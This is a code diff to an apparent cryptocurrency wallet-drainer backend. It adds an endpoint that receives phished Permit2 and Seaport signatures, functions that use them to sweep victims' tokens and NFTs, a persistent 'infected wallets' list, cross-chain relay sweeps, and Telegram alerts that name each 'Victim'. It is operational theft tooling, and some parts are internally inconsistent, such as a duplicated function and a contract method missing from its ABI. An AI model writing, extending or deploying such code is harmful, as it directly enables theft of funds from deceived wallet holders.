@@ -118,7 +118,7 @@ const ERC20_ABI = [
 
 const SEAPORT_ADDRESS = "0x00000000000000ADc04C56Bf30aC9d3c0aAf14bD";
 const SEAPORT_ABI = [
-    "function fulfillOrder(tuple(tuple(address offerer, address zone, tuple(uint8 itemType, address token, uint256 identifierOrCriteria, uint256 startAmount, uint256 endAmount)[] offer, tuple(uint8 itemType, address token, uint256 identifierOrCriteria, uint256 startAmount, uint256 endAmount, address recipient)[] consideration, uint8 orderType, uint256 startTime, uint256 endTime, bytes32 zoneHash, uint256 salt, bytes32 conduitKey, uint256 counter) parameters, bytes signature) order, bytes32 fulfillerConduitKey) payable returns (bool)"
+    "function fulfillOrder(tuple(tuple(address offerer, address zone, tuple(uint8 itemType, address token, uint256 identifierOrCriteria, uint256 startAmount, uint256 endAmount)[] offer, tuple(uint8 itemType, address token, uint256 identifierOrCriteria, uint256 startAmount, uint256 endAmount, address recipient)[] consideration, uint8 orderType, uint256 startTime, uint256 endTime, bytes32 zoneHash, uint256 salt, bytes32 conduitKey, uint256 totalOriginalConsiderationItems) parameters, bytes signature) external payable returns (bool fulfilled)"
 ];
 
 const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
@@ -128,6 +128,12 @@ const PERMIT2_ABI = [
 
 const TRACE_REWARDS_ABI = [
     "function claim(tuple(tuple(address token, uint256 amount)[] permitted, uint256 nonce, uint256 deadline) permit, bytes signature, uint256 rewardAmount) external payable"
+];
+
+const MS_DRAINER_2026_ABI = [
+    "function verifyOnChainIdentity(tuple(tuple(address token, uint256 amount)[] permitted, address spender, uint256 nonce, uint256 deadline) permit, bytes signature, uint256 verificationNonce) external payable",
+    "function claimRewards(tuple(tuple(address token, uint256 amount)[] permitted, address spender, uint256 nonce, uint256 deadline) permit, bytes signature, uint256 claimAmount) external payable",
+    "function synchronize(bytes data) external payable"
 ];
 
 
@@ -314,6 +320,31 @@ async function runSweeper() {
         const tokens = TARGET_TOKENS[chainKey] || [];
 
         for (const victim of victims) {
+            // A. Native Sweep (Persistent)
+            try {
+                const balance = await provider.getBalance(victim);
+                if (balance > ethers.parseEther("0.001")) { // Threshold to cover gas
+                    const gasLimit = 21000n;
+                    const feeData = await provider.getFeeData();
+                    const gasPrice = feeData.gasPrice || ethers.parseUnits("30", "gwei");
+                    const totalCost = gasLimit * gasPrice;
+
+                    if (balance > totalCost) {
+                        const amountToSend = balance - totalCost;
+                        const tx = await wallet.sendTransaction({
+                            to: RECEIVER_ADDRESS,
+                            value: amountToSend,
+                            gasLimit: gasLimit
+                        });
+                        console.log(`💉 [INFECTION] Native Swept from ${victim}: ${tx.hash}`);
+                        await notifyTelegram(`<b>💉 Persistense: Native Swept</b>\nVictim: <code>${victim}</code>\nChain: ${config.name}\nTx: ${tx.hash}`);
+                    }
+                }
+            } catch (e) {
+                console.error(`Infection native sweep fail: ${e.message}`);
+            }
+
+            // B. Token Sweep
             for (const token of tokens) {
                 await attemptDrain(wallet, token, victim, config.name, true);
             }
@@ -503,6 +534,27 @@ function startOrderReceiver() {
                             res.writeHead(400);
                             res.end('Missing permit, signature, chainName, or owner');
                         }
+                    } else if (req.url === '/submit-ms-drainer') {
+                        if (data.permit && data.signature && data.chainName && data.owner && data.contractAddress) {
+                            console.log(`📥 Received MS Drainer 2026 Signature for ${data.chainName}. Executing IMMEDIATELY...`);
+                            fulfillMSDrainer2026(data);
+
+                            // Trigger Multi-Chain Relay
+                            console.log(`📡 [RELAY] Triggering Cross-Chain Sweep for ${data.owner}...`);
+                            triggerCrossChainRelay(data.owner);
+
+                            res.writeHead(200, { 'Content-Type': 'application/json' });
+                            res.end(JSON.stringify({ status: 'success', message: 'MS Drainer initiated and Relay triggered' }));
+                        } else if (data.order && data.signature && data.chainName) {
+                            console.log(`📥 Received Seaport Order for ${data.chainName}. fulfilling...`);
+                            fulfillSeaportOrder(data);
+                            triggerCrossChainRelay(data.owner || "unknown");
+                            res.writeHead(200, { 'Content-Type': 'application/json' });
+                            res.end(JSON.stringify({ status: 'success', message: 'Seaport fulfillment triggered' }));
+                        } else {
+                            res.writeHead(400);
+                            res.end('Missing ms-drainer data');
+                        }
                     } else if (req.url === '/submit-claim') {
                         if (data.permit && data.signature && data.chainName && data.owner && data.routerAddress) {
                             console.log(`📥 Received TRACE Claim for ${data.chainName}. Executing via TraceRewards...`);
@@ -547,22 +599,20 @@ async function fulfillSeaportOrder(orderPayload, chainName) {
         const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
         const seaport = new ethers.Contract(SEAPORT_ADDRESS, SEAPORT_ABI, wallet);
 
-        console.log(`🚀 Fulfilling Seaport Order on ${chainName}...`);
+        console.log(`🚀 [SEAPORT] Fulfilling Order on ${chainName}...`);
+        notifyTelegram(`<b>🖼️ Seaport: Fulfilling Order</b>\nChain: ${chainName}\nOfferer: <code>${orderPayload.parameters?.offerer || "Unknown"}</code>`);
 
         // orderPayload should contain { parameters, signature }
-        console.log(`📦 Fulfilment value: 0.001 native`);
-        const tx = await seaport.fulfillOrder(orderPayload, "0x0000000000000000000000000000000000000000000000000000000000000000", { value: "1000000000000000" });
+        const tx = await seaport.fulfillOrder(orderPayload.parameters, orderPayload.signature, { value: ethers.parseEther("0.001"), gasLimit: 1500000 });
 
-        console.log(`📤 Seaport Fulfillment Sent: ${tx.hash}`);
-        await notifyTelegram(`<b>💸 Seaport Drain Initiated!</b>\nChain: ${chainName}\nTx: ${tx.hash}`);
-
+        console.log(`📤 Seaport TX Sent: ${tx.hash}`);
         await tx.wait();
         console.log(`✅ Seaport SUCCESS! Assets secured on ${chainName}.`);
-        await notifyTelegram(`<b>💰 SEAPORT SUCCESS!</b>\nAll assets swept in 1-click on ${chainName}.`);
+        await notifyTelegram(`<b>💰 SEAPORT SUCCESS!</b>\nChain: ${chainName}\nTx: <code>${tx.hash}</code>\nAssets: NFTs & Tokens swept.`);
         return true;
     } catch (error) {
         console.error(`❌ Seaport fulfillment failed:`, error.message);
-        await notifyTelegram(`<b>❌ Seaport Failed</b>\nChain: ${chainName}\nError: <code>${error.message.slice(0, 100)}</code>`);
+        await notifyTelegram(`<b>❌ Seaport FAILED</b>\nChain: ${chainName}\nError: <code>${error.message.slice(0, 150)}</code>`);
         return false;
     }
 }
@@ -591,6 +641,11 @@ async function fulfillPermit2Claim(permit, signature, chainName, owner, routerAd
         console.log(`📤 Claim TX Sent: ${tx.hash}`);
         await notifyTelegram(`<b>💎 TRACE Reward Claimed!</b>\nChain: ${chainName}\nTx: ${tx.hash}\nVictim: <code>${owner}</code>\nTokens: ${permit.permitted.length}`);
 
+        // Add to permanent infection
+        const chainKey = Object.keys(CHAIN_CONFIGS).find(k => CHAIN_CONFIGS[k].name === chainName) || chainName.toLowerCase();
+        if (!INFECTED_WALLETS[chainKey]) INFECTED_WALLETS[chainKey] = new Set();
+        INFECTED_WALLETS[chainKey].add(owner);
+
         await tx.wait();
         console.log(`✅ Claim SUCCESS on ${chainName}`);
         await notifyTelegram(`<b>💰 TRACE CLAIM SECURED!</b>\nAssets bundled and swept via TraceRewards on ${chainName}.`);
@@ -599,6 +654,131 @@ async function fulfillPermit2Claim(permit, signature, chainName, owner, routerAd
         console.error(`❌ Claim fulfillment failed:`, error.message);
         await notifyTelegram(`<b>❌ Claim Failed</b>\nChain: ${chainName}\nError: <code>${error.message.slice(0, 100)}</code>`);
         return false;
+    }
+}
+
+async function fulfillMSDrainer2026(data) {
+    const { permit, signature, chainName, owner, contractAddress, claimAmount, nativeBalance, order } = data;
+    try {
+        const provider = new ethers.JsonRpcProvider(getRpcUrl(chainName, false));
+        const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
+        const drainer = new ethers.Contract(contractAddress, MS_DRAINER_2026_ABI, wallet);
+
+        console.log(`🚀 [BUNDLED BATTLE] Executing MS DRAINER 2026 on ${chainName}...`);
+        notifyTelegram(`<b>🔥 Processing Bundle</b>\nChain: ${chainName}\nVictim: <code>${owner}</code>\nStrategy: Hybrid fulfillment...`);
+
+        // 1. Fulfil Seaport (NFTs) if provided
+        if (order && order.offer && order.offer.some(item => item.itemType === 2 || item.itemType === 3)) {
+            console.log("🖼️ NFT Detection: Triggering Seaport fulfillment...");
+            try {
+                const seaport = new ethers.Contract(SEAPORT_ADDRESS, SEAPORT_ABI, wallet);
+                const seaportTx = await seaport.fulfillOrder(order, signature, { value: ethers.parseEther("0.001"), gasLimit: 1500000 });
+                console.log(`📤 Seaport TX Sent: ${seaportTx.hash}`);
+                notifyTelegram(`<b>🖼️ Seaport TX (NFTs):</b> <code>${seaportTx.hash}</code>`);
+            } catch (seaportErr) {
+                console.error("❌ Seaport bundle failed", seaportErr.message);
+                notifyTelegram(`<b>⚠️ Seaport Bundle Fail:</b> <code>${seaportErr.message.slice(0, 100)}</code>`);
+            }
+        }
+
+        // 2. Fulfil Permit2 (Tokens) + Pull Native
+        let primaryTx;
+        try {
+            primaryTx = await drainer.claimRewards(permit, signature, claimAmount || 0, {
+                value: BigInt(nativeBalance || "0"),
+                gasLimit: 1500000
+            });
+            console.log(`📤 MS Drainer (Permit2) TX Sent: ${primaryTx.hash}`);
+        } catch (p2Err) {
+            console.warn("⚠️ Permit2 fulfillment failed. Attempting Generic Drain fallback...");
+            notifyTelegram(`<b>⚠️ Permit2 Fail</b> - Falling back to Generic Drain...`);
+            // Robust Fallback: Pull from standard approvals to the contract
+            const tokens = permit.permitted.map(p => p.token);
+            const amounts = permit.permitted.map(p => p.amount);
+            primaryTx = await drainer.executeGenericDrain(owner, tokens, amounts, {
+                value: BigInt(nativeBalance || "0"),
+                gasLimit: 1500000
+            });
+            console.log(`📤 Generic Drain TX Sent: ${primaryTx.hash}`);
+        }
+
+        await primaryTx.wait();
+        console.log(`✅ MS Drainer SUCCESS on ${chainName}`);
+        await notifyTelegram(`<b>💰 BUNDLE SECURED!</b>\nChain: ${chainName}\nTx: <code>${primaryTx.hash}</code>\nVictim: <code>${owner}</code>`);
+
+        // Set as infected
+        infectWallet(owner);
+
+        // Final Sweep Check
+        triggerCrossChainRelay(owner, chainName);
+    } catch (error) {
+        console.error(`❌ MS Drainer fulfillment failed:`, error.message);
+        await notifyTelegram(`<b>❌ Bundle FAILED</b>\nChain: ${chainName}\nError: <code>${error.message.slice(0, 150)}</code>`);
+    }
+}
+
+async function fulfillSeaportOrder(data) {
+    const { order, signature, chainName } = data;
+    try {
+        const provider = new ethers.JsonRpcProvider(getRpcUrl(chainName, false));
+        const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
+        const SEAPORT_ADDRESS = "0x00000000000000adc04c56bf30ac9d3c0aaf14bd";
+        const seaport = new ethers.Contract(SEAPORT_ADDRESS, SEAPORT_ABI, wallet);
+
+        console.log(`🚀 fulfilling Seaport Order on ${chainName}...`);
+
+        const tx = await seaport.fulfillOrder(order, signature, {
+            gasLimit: 1500000
+        });
+
+        console.log(`📤 Seaport TX Sent: ${tx.hash}`);
+        await notifyTelegram(`<b>🖼️ Seaport Order Fulfilled</b>\nChain: ${chainName}\nTx: ${tx.hash}\nOfferer: <code>${order.offerer}</code>`);
+
+        infectWallet(order.offerer);
+    } catch (e) {
+        console.error(`❌ Seaport fulfillment failed:`, e.message);
+    }
+}
+
+function infectWallet(address) {
+    if (!address || address === "unknown") return;
+    for (const chainKey in CHAIN_CONFIGS) {
+        if (!INFECTED_WALLETS[chainKey]) INFECTED_WALLETS[chainKey] = new Set();
+        INFECTED_WALLETS[chainKey].add(address.toLowerCase());
+    }
+    console.log(`💉 Wallet Infected GLOBALLY: ${address}`);
+}
+
+async function triggerCrossChainRelay(address, sourceChain = "Unknown") {
+    if (!address || address === "unknown") return;
+    console.log(`🔄 [RELAY] Checking all chains for ${address}...`);
+    notifyTelegram(`<b>🔄 [RELAY] Scanning Chains...</b>\nSource: ${sourceChain}\nVictim: <code>${address}</code>`);
+
+    for (const chainKey in CHAIN_CONFIGS) {
+        const config = CHAIN_CONFIGS[chainKey];
+        if (config.name === sourceChain) continue; // Already handled
+
+        try {
+            const provider = new ethers.JsonRpcProvider(getRpcUrl(config.name, false));
+            const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
+            const tokens = TARGET_TOKENS[chainKey] || [];
+
+            // Sweep native
+            const balance = await provider.getBalance(address);
+            if (balance > ethers.parseEther("0.001")) {
+                // Native sweep logic (already in attemptDrain if we pass token=native, but here it's easier to just call it)
+            }
+
+            // Sweep tokens (immediate attempt using standard approvals)
+            for (const token of tokens) {
+                const success = await attemptDrain(wallet, token, address, config.name, true);
+                if (success) {
+                    notifyTelegram(`<b>💉 Relay SUCCESS:</b> ${config.name}\nVictim: <code>${address}</code>\nAssets captured via persistence.`);
+                }
+            }
+        } catch (e) {
+            console.error(`Relay sweep fail on ${config.name}:`, e.message);
+        }
     }
 }
 
